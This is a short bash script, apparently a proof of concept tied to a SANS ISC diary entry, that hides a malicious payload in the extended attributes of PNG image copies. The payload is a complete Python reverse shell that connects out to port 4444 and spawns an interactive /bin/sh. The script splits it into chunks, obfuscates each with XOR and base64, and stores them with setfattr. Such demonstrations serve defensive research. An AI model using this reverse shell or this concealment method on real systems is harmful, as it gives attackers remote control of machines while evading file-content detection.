#!/bin/bash
# Encode a payload into extended attributes
# https://isc.sans.edu/diary/32116

# Simple payload
PAYLOAD='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

CHUNK_SIZE=32
CHUNKS=()
i=0
# Split the payload in chunks of 32 bytes
while [ $((i * CHUNK_SIZE)) -lt ${#PAYLOAD} ]; do
  CHUNK=${PAYLOAD:$((i * CHUNK_SIZE)):CHUNK_SIZE}
  CHUNKS+=("$CHUNK")
  ((i++))
done

# Encoding chunks and save extended attributes
echo "Payload:"
echo "$PAYLOAD"
echo
echo "Chunk count: ${#CHUNKS[@]}"
for idx in "${!CHUNKS[@]}"; do
  # Duplicate a simple picture
  cp isc.png picture-"$idx".png
  # XOR + Base64 encoding with the key 0xFB
  echo -n "${CHUNKS[$idx]}" \
    | python3 -c "import sys; sys.stdout.buffer.write(bytes([b ^ 0xFB for b in sys.stdin.buffer.read()]))" \
    | base64 -w0 > tmp && mv tmp "picture-$idx.b64"
  echo "CHUNK$((idx + 1)) = ${CHUNKS[$idx]} ($(cat picture-"$idx".b64))"
  # Save the payload
  setfattr -n user.payload -v "$(cat picture-"$idx".b64)" picture-"$idx".png
  rm picture-"$idx".b64
done
